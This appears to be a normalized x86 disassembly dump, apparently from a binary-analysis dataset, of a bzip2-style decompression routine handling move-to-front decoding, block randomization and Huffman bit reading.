add edx [ ebp - 0x118 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax + ecx + 0xe7c ]
mov [ edx + 0xe7c ] cl
mov edx [ ebp - 0x118 ]
sub edx 0x1
mov [ ebp - 0x118 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov ecx [ ebp + 0x8 ]
mov edx [ edx + eax * 4 ]
mov [ ecx + 0x38 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
and ecx 0xff
movzx edx cl
mov eax [ ebp + 0x8 ]
mov [ eax + 0x3c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
shr edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax + 0x38 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
and eax 0xff
movzx ecx al
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x440 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x4 ]
jge r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x11c ]
sub eax 0x1
mov [ ebp - 0x11c ] eax
mov ecx [ ebp - 0x124 ]
sub ecx 0x1
mov [ ebp - 0x124 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x14 ] 0x1
sete dl
mov eax [ ebp + 0x8 ]
xor edx [ eax + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx * 4 + rw-data ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x200
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc50 ]
mov eax [ ebp - 0x18 ]
movzx edx [ edx + eax * 2 ]
mov eax [ ebp - 0x18 ]
sar eax 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
movzx eax [ ecx + eax ]
mov ecx [ ebp - 0x18 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov [ ebp - 0x74 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
mov ecx [ ebp - 0x18 ]
mov dl [ eax + ecx * 2 ]
mov [ ebp - 0x39 ] dl
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x848 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc50 ]
mov eax [ ebp - 0x18 ]
mov [ ecx + eax * 2 ] dx
mov ecx [ ebp - 0x18 ]
and ecx 0x1
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x74 ]
sar eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc54 ]
movzx eax [ edx + eax ]
and eax 0xf
mov ecx [ ebp - 0x18 ]
sar ecx 0x10
shl ecx 0x4
or eax ecx
mov edx [ ebp - 0x74 ]
sar edx 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
mov [ edx + ecx ] al
mov ecx [ ebp - 0x74 ]
sar ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc54 ]
movzx ecx [ eax + ecx ]
and ecx 0xf0
mov edx [ ebp - 0x18 ]
sar edx 0x10
or ecx edx
mov eax [ ebp - 0x74 ]
sar eax 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc54 ]
mov [ eax + edx ] cl
jmp r-xdata
mov ecx [ ebp - 0x18 ]
sar ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc54 ]
movzx ecx [ eax + ecx ]
and ecx 0xf
movzx edx [ ebp - 0x39 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0x848 ]
sar edx 0x10
shl edx 0x4
or ecx edx
mov eax [ ebp - 0x18 ]
sar eax 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc54 ]
mov [ eax + edx ] cl
mov edx [ ebp - 0x18 ]
sar edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc54 ]
movzx edx [ ecx + edx ]
and edx 0xf0
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0x848 ]
sar eax 0x10
or edx eax
mov ecx [ ebp - 0x18 ]
sar ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
mov [ ecx + eax ] dl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc50 ]
mov eax [ ebp - 0x74 ]
movzx edx [ edx + eax * 2 ]
mov eax [ ebp - 0x74 ]
sar eax 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
movzx eax [ ecx + eax ]
mov ecx [ ebp - 0x74 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov [ ebp - 0x134 ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xffff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
mov edx [ ebp - 0x74 ]
mov [ eax + edx * 2 ] cx
mov eax [ ebp - 0x74 ]
and eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x34 ]
mov [ eax + 0x38 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] 0x0
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x10 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x74 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x134 ]
mov [ ebp - 0x74 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx + 0x34 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x848 ]
add edx 0x1
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x848 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x444
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
call sub_40aa70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc50 ]
movzx eax [ edx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
shr edx 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
movzx edx [ ecx + edx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr edx cl
and edx 0xf
shl edx 0x10
or eax edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x440 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
add edx 0x444
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
push ecx
call sub_40aa70
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
movzx edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x14 ] 0x1
sete al
mov ecx [ ebp + 0x8 ]
xor eax [ ecx + 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x200
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
sub_40ed1e
jmp r-xdata
jmp r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x34 ] 0x0
jl r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x20 ]
jne r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x34 ]
cmp ecx [ ebp - 0x4 ]
jl r-xdata
cmp [ ebp - 0x34 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ eax + 0xfa14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x74 ]
mov [ edx + 0xfa18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x6c ]
mov [ ecx + 0xfa1c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ eax + 0xfa20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x68 ]
mov [ edx + 0xfa24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x64 ]
mov [ ecx + 0xfa28 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0xfa2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x60 ]
mov [ edx + 0xfa30 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x70 ]
mov [ ecx + 0xfa34 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x34 ]
mov [ eax + 0xfa38 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + 0xfa3c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0xfa40 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x30 ]
mov [ eax + 0xfa44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x50 ]
mov [ edx + 0xfa48 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ ecx + 0xfa4c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x54 ]
mov [ eax + 0xfa50 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4c ]
mov [ edx + 0xfa54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0xfa58 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0xfa5c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x48 ]
mov [ edx + 0xfa60 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x40 ]
mov [ ecx + 0xfa64 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x2c ]
mov [ eax + 0xfa68 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x5c ]
mov [ edx + 0xfa6c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x58 ]
mov [ ecx + 0xfa70 ] edx
mov eax [ ebp - 0x10 ]
pop esi
mov ecx [ ebp - 0xd8 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx + 0x444 ] 0x0
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
mov [ ebp - 0x30 ] 0xffffffff
mov [ ebp - 0x50 ] 0x1
cmp [ ebp - 0x34 ] 0x1
jne r-xdata
cmp [ ebp - 0x18 ] 0x100
jg r-xdata
cmp [ ebp - 0x34 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x30 ]
add ecx [ ebp - 0x50 ]
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jl r-xdata
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov esi [ ebp + 0x8 ]
mov eax [ esi + eax * 4 + 0x3c ]
mov [ edx + ecx * 4 + 0x444 ] eax
jmp r-xdata
mov edx [ ebp - 0x50 ]
shl edx 0x1
mov [ ebp - 0x50 ] edx
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x30 ]
lea ecx [ eax + edx * 2 ]
mov [ ebp - 0x30 ] ecx
mov eax [ ebp - 0x34 ]
sub eax 0x1
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x10
jae r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
cmp [ ebp - 0x18 ] 0x100
jg r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x70 ]
sub ecx 0x1
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x26
mov eax [ ebp - 0x60 ]
add eax 0x1
mov [ ebp - 0x60 ] eax
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x64 ]
jl r-xdata
mov eax [ ebp - 0x114 ]
shr eax 0x4
mov [ ebp - 0x120 ] eax
mov eax [ ebp - 0x114 ]
xor edx edx
mov ecx 0x10
div ecx
mov [ ebp - 0x110 ] edx
mov edx [ ebp - 0x120 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x1e7c ]
add ecx [ ebp - 0x110 ]
mov [ ebp - 0x10c ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x10c ]
mov al [ edx + 0xe7c ]
mov [ ebp - 0x39 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1e7c ]
mov [ ebp - 0x10c ] edx
mov eax [ ebp - 0x10c ]
add eax [ ebp - 0x114 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + eax + 0xe7c ]
mov [ ebp - 0x39 ] dl
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x444 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
add ecx [ eax + edx * 4 + 0x440 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x444 ] ecx
jmp r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov [ ebp - 0x70 ] 0x32
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x60 ]
movzx eax [ edx + 0x1ebc ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x48 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xf9fc ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xb16c ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xe1cc ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xc99c ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov edx [ ebp - 0x120 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x1e7c ]
add ecx 0x1
mov edx [ ebp - 0x120 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x1e7c ] ecx
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x10c ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x10c ]
mov al [ edx + 0xe7b ]
mov [ ecx + 0xe7c ] al
mov ecx [ ebp - 0x10c ]
sub ecx 0x1
mov [ ebp - 0x10c ] ecx
jmp r-xdata
cmp [ ebp - 0x114 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x10c ]
add eax [ ebp - 0x114 ]
mov [ ebp - 0x128 ] eax
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x128 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x128 ]
mov al [ edx + 0xe7b ]
mov [ ecx + 0xe7c ] al
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x128 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x128 ]
mov al [ edx + 0xe7a ]
mov [ ecx + 0xe7b ] al
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x128 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x128 ]
mov al [ edx + 0xe79 ]
mov [ ecx + 0xe7a ] al
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x128 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x128 ]
mov al [ edx + 0xe78 ]
mov [ ecx + 0xe79 ] al
mov ecx [ ebp - 0x114 ]
sub ecx 0x4
mov [ ebp - 0x114 ] ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x100
jg r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
js r-xdata
cmp [ ebp - 0x4c ] 0x14
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
mov edx 0x1
mov ecx [ ebp - 0x4c ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x104 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0x104 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1e7c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1e7c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1e7c ]
mov eax [ ebp + 0x8 ]
mov cl [ ebp - 0x39 ]
mov [ eax + edx + 0xe7c ] cl
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1e7c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x120 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x1e7c ]
sub eax 0x1
mov ecx [ ebp - 0x120 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x1e7c ] eax
mov eax [ ebp - 0x120 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x1e78 ]
mov eax [ ebp - 0x120 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0x1e7c ]
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov dl [ esi + edx + 0xe8b ]
mov [ ecx + eax + 0xe7c ] dl
mov eax [ ebp - 0x120 ]
sub eax 0x1
mov [ ebp - 0x120 ] eax
jmp r-xdata
mov ecx [ ebp - 0x120 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10c ]
cmp eax [ edx + ecx * 4 + 0x1e7c ]
jle r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x10c ]
mov dl [ ebp - 0x39 ]
mov [ ecx + 0xe7c ] dl
jmp r-xdata
mov edx [ ebp - 0x10c ]
add edx [ ebp - 0x114 ]
mov eax [ ebp - 0x10c ]
add eax [ ebp - 0x114 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov dl [ esi + edx + 0xe7b ]
mov [ ecx + eax + 0xe7c ] dl
mov eax [ ebp - 0x114 ]
sub eax 0x1
mov [ ebp - 0x114 ] eax
jmp r-xdata
cmp [ ebp - 0x114 ] 0x3
jbe r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc60 ] 0xffffffff
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x2
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x30 ] 0x2
jl r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + edx * 4 + 0x444 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
cmp edx 0x102
jl r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + edx * 4 ]
jg r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + eax + 0xd7c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x40 ]
add ecx 0x1
movzx edx [ ebp - 0x39 ]
mov eax [ ebp + 0x8 ]
movzx edx [ eax + edx + 0xd7c ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x40 ] ecx
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x28 ]
test edx edx
je r-xdata
mov [ ebp - 0x118 ] 0xfff
mov [ ebp - 0x11c ] 0xf
jmp r-xdata
cmp [ ebp - 0x120 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x28 ]
test ecx ecx
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x444 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x58 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov edx [ ebp - 0x4c ]
add edx 0x1
mov [ ebp - 0x4c ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x27
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
movzx ecx [ ebp - 0x39 ]
mov edx [ ebp + 0x8 ]
movzx eax [ edx + ecx + 0xd7c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov ecx [ ebp - 0x4 ]
mov [ edx + ecx * 4 ] eax
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
movzx dx [ ecx + eax + 0xd7c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc50 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp [ ebp - 0x11c ] 0x0
jl r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp [ ebp - 0x34 ] 0x1
je r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x1
or edx [ ebp - 0x24 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x1
jl r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x70 ]
sub ecx 0x1
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x28
mov eax [ ebp - 0x60 ]
add eax 0x1
mov [ ebp - 0x60 ] eax
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x64 ]
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x70 ] 0x0
